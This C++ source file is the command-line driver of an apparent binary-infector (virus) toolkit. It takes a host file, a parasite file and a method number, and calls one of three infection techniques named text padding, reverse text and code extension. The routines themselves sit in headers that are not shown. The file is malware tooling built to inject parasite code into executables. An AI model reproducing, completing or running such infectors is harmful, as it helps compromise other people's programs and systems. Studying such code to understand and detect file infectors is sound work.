#include "infector/common.hh"
#include "infector/extend_code_infect.hh"
#include "infector/padding_infect.hh"
#include "infector/reverse_text_infect.hh"
#include "std/stdio.hh"
#include "std/stdlib.hh"

enum class Infection {
  TEXT_PADDING = 0,
  REVERSE_TEXT = 1,
  EXTEND_CODE = 2,
};

// Usage %s <host> <parasite> <infection method>
int main(int argc, char** argv) {
  if (argc != 4) {
    return EXIT_FAILURE;
  }

  auto method = static_cast<Infection>(atoi(argv[3]));
  bool ret = false;
  switch (method) {
    case Infection::TEXT_PADDING:
      ret = vt::infector::infect<vt::infector::PaddingInfect>(argv[1], argv[2]);
      break;
    case Infection::REVERSE_TEXT:
      ret = vt::infector::infect<vt::infector::ReverseTextInfect>(argv[1],
                                                                  argv[2]);
      break;
    case Infection::EXTEND_CODE:
      ret = vt::infector::infect<vt::infector::ExtendCodeInfect>(argv[1],
                                                                 argv[2]);
      break;
    default:
      CHECK_FAIL();
  }

  return ret ? EXIT_SUCCESS : EXIT_FAILURE;
}